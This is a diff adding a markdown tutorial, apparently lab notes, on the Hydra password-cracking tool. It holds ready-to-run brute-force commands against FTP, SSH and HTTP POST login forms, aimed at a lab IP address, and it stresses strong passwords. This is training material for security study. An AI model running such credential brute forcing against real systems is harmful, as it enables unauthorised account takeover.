@@ -1,0 +1,66 @@
+### What is Hydra?
+Hydra is a brute force online password cracking program, designed as a quick system login password "hacking" tool.
+
+Hydra can efficiently "brute force" authentication services, such as SSH, Web Application Forms, FTP, or SNMP, by running through a password list and speeding up the process of determining the correct password.
+
+According to its [official repository](https://github.com/vanhauser-thc/thc-hydra), Hydra supports brute forcing the following protocols:
+
+- Asterisk
+- AFP
+- Cisco AAA
+- Cisco auth
+- ... (Complete list available in the official repository)
+
+For more details on the options for each protocol, refer to the [Kali Hydra tool page](https://tools.kali.org/password-attacks/hydra).
+
+This emphasizes the importance of using a strong password to avoid being easily guessed. A one-hundred-million-password list often contains common passwords, making it crucial to change default login credentials for applications like CCTV cameras and web frameworks.
+
+### Installing Hydra
+Hydra is already installed on the AttackBox. Access it by clicking on the [Start AttackBox](#) button.
+
+If you prefer the in-browser Kali machine, Hydra is pre-installed. Select "Use Kali Linux" and click [Start Kali Linux](#).
+
+For other Linux distributions, check the [official THC-Hydra repository](https://github.com/vanhauser-thc/thc-hydra).
+
+### Hydra Commands
+Commands for Hydra depend on the service (protocol) being attacked. For FTP brute force with the username "user" and password list "passlist.txt":
+
+```bash
+hydra -l user -P passlist.txt ftp://10.10.224.88
+```
+
+#### SSH
+```bash
+hydra -l <username> -P <full path to pass> 10.10.224.88 -t 4 ssh
+```
+
+- `-l`: SSH username
+- `-P`: Password list
+- `-t`: Number of threads
+
+Example:
+
+```bash
+hydra -l root -P passwords.txt 10.10.224.88 -t 4 ssh
+```
+
+#### Web Form (POST method)
+```bash
+hydra -l <username> -P <wordlist> 10.10.224.88 http-post-form "<path>:<login_credentials>:<invalid_response>"
+```
+
+- `-l`: Web form username
+- `-P`: Password list
+- `http-post-form`: Form type (POST)
+- `<path>`: Login page URL
+- `<login_credentials>`: Username and password format
+- `<invalid_response>`: Response when login fails
+- `-V`: Verbose output
+
+Example:
+
+```bash
+hydra -l user -P wordlist.txt 10.10.224.88 http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V
+```
+
+This command brute forces a POST login form with specified parameters.
